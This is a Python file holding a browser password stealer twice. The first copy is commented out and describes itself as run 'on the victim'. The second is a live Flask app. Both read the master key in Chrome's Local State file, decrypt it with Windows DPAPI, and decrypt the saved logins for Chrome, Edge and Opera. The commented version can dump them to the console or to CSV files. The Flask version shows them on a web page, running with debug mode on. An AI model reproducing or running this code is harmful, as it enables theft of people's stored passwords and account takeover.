# #!/usr/bin/env python3
# ## -- Windows Only !! and Victim Only (because uses Windows API's) !! --
# ## Source: https://github.com/agentzex/chrome_v80_password_grabber
# ##  Run on the victim, works for Chrome, Edge (Chromium) and even Opera
# ##  Tested on Local systems, Local AD systems ánd Azure AD systems
# import os, sys, json, base64, sqlite3, shutil, binascii, argparse
# import win32crypt  ## pip install pypiwin32
# from Crypto.Cipher import AES ## pip install pycryptodome

# def get_master_key(masterkey_file):
#     with open(masterkey_file, "r") as f:
#         local_state = f.read()
#         local_state = json.loads(local_state)
#     master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
#     master_key = master_key[5:]  # removing DPAPI string
#     master_key = win32crypt.CryptUnprotectData(master_key)[1] ## this is the part that makes this script only usable on the victim
#     return master_key

# def decrypt_password(buff, master_key):
#     try:
#         iv = buff[3:15]
#         payload = buff[15:]
#         cipher = AES.new(master_key, AES.MODE_GCM, iv)
#         decrypted_pass = cipher.decrypt(payload)
#         decrypted_pass = decrypted_pass[:-16].decode()  # remove suffix bytes
#         return decrypted_pass
#     except Exception as e:
#         # print("Probably saved password from Chrome version older than v80\n")
#         # print(str(e))
#         return "Chrome < 80 or domain cred"

# def listCreds(login_db, master_key, boolVerbose=False, sCSVFile = ''):
#     shutil.copy2(login_db, "Loginvault.db") #making a temp copy since Login Data DB is locked while Chrome is running
#     conn = sqlite3.connect("Loginvault.db")
#     cursor = conn.cursor()
#     if not sCSVFile == '':
#         file = open(sCSVFile, 'a')
#         file.write('URL;User Name;Password\n')
#     lstCreds = []
#     try:
#         cursor.execute("SELECT action_url, username_value, password_value FROM logins")
#         for r in cursor.fetchall():
#             url = r[0]
#             username = r[1]
#             encrypted_password = r[2]
#             decrypted_password = decrypt_password(encrypted_password, master_key)
#             if boolVerbose: print("URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "*" * 50 + "\n")
#             if not sCSVFile == '': file.write("{};{};{}\n".format(url,username,decrypted_password))
#             lstCreds.append((url, username, decrypted_password))
#     except Exception as e:
#         pass

#     cursor.close()
#     conn.close()
#     if not sCSVFile == '': file.close()
#     try: os.remove("Loginvault.db")
#     except Exception as e: pass
#     return lstCreds
    
# if __name__ == '__main__':
#     oParser = argparse.ArgumentParser()
#     oParser.add_argument('--verbose', '-v', action = 'store_true', default = False, help='Prints the creds to console')
#     oParser.add_argument('--csv', '-c', default = '', help='Exports creds to <browser>-filename.csv')
#     oArgs = oParser.parse_args()
#     ### Chrome
#     ## "C:\Users\<user>\AppData\Local\Google\Chrome\User Data\Local State"
#     masterkey_file = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State'
#     ## C:\Users\<user>\AppData\Local\Google\Chrome\User Data\Default\Login Data
#     login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\default\Login Data'
#     sCSVFile = ''
#     if oArgs.csv: sCSVFile = 'chrome_' + oArgs.csv

#     try:
#         master_key = get_master_key(masterkey_file)
#         lstChromeCreds = listCreds(login_db, master_key, oArgs.verbose, sCSVFile)
#         print('[+] Decrypted ' + str(len(lstChromeCreds)) + ' Chrome credentials')
#     except: pass

#     ### Edge Chromium
#     masterkey_file = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Microsoft\Edge\User Data\Local State'
#     login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Microsoft\Edge\User Data\default\Login Data'
#     if oArgs.csv: sCSVFile = 'edge_' + oArgs.csv

#     try:
#         master_key = get_master_key(masterkey_file)
#         lstChromeCreds = listCreds(login_db, master_key, oArgs.verbose, sCSVFile)
#         print('[+] Decrypted ' + str(len(lstChromeCreds)) + ' Edge credentials')
#     except: pass

#     ### Opera: %appdata%\Opera Software\Opera Stable\
#     masterkey_file = os.environ['USERPROFILE'] + os.sep + r'AppData\Roaming\Opera Software\Opera Stable\Local State'
#     login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Roaming\Opera Software\Opera Stable\Login Data'
#     if oArgs.csv: sCSVFile = 'opera_' + oArgs.csv

#     try:
#         master_key = get_master_key(masterkey_file)
#         lstChromeCreds = listCreds(login_db, master_key, oArgs.verbose, sCSVFile)
#         print('[+] Decrypted ' + str(len(lstChromeCreds)) + ' Opera credentials')
#     except: pass
    
#     if not oArgs.verbose: print('[!] To print the credentials to terminal, rerun with "--verbose"')
#     if len(sys.argv)<=1: input('[+] All done, press enter')


from flask import Flask, render_template, request
import os, json, base64, sqlite3, shutil
import win32crypt  # pip install pypiwin32
from Crypto.Cipher import AES  # pip install pycryptodome

app = Flask(__name__)

def get_master_key(masterkey_file):
    with open(masterkey_file, "r") as f:
        local_state = f.read()
        local_state = json.loads(local_state)
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]  # removing DPAPI string
    master_key = win32crypt.CryptUnprotectData(master_key)[1]
    return master_key

def decrypt_password(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass
    except Exception as e:
        return "Chrome < 80 or domain cred"

def list_creds(login_db, master_key):
    shutil.copy2(login_db, "Loginvault.db")
    conn = sqlite3.connect("Loginvault.db")
    cursor = conn.cursor()
    lst_creds = []
    try:
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        for r in cursor.fetchall():
            url = r[0]
            username = r[1]
            encrypted_password = r[2]
            decrypted_password = decrypt_password(encrypted_password, master_key)
            lst_creds.append((url, username, decrypted_password))
    except Exception as e:
        pass

    cursor.close()
    conn.close()
    os.remove("Loginvault.db")
    return lst_creds

def get_credentials(browser):
    if browser == 'chrome':
        masterkey_file = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State'
        login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\default\Login Data'
    elif browser == 'edge':
        masterkey_file = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Microsoft\Edge\User Data\Local State'
        login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Microsoft\Edge\User Data\default\Login Data'
    elif browser == 'opera':
        masterkey_file = os.environ['USERPROFILE'] + os.sep + r'AppData\Roaming\Opera Software\Opera Stable\Local State'
        login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Roaming\Opera Software\Opera Stable\Login Data'
    else:
        return []

    try:
        master_key = get_master_key(masterkey_file)
        creds = list_creds(login_db, master_key)
        return creds
    except Exception as e:
        print(e)
        return []

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/get_creds', methods=['POST'])
def get_creds():
    browser = request.form.get('browser')
    creds = get_credentials(browser)
    return render_template('index.html', creds=creds, browser=browser)

if __name__ == '__main__':
    app.run(debug=True)
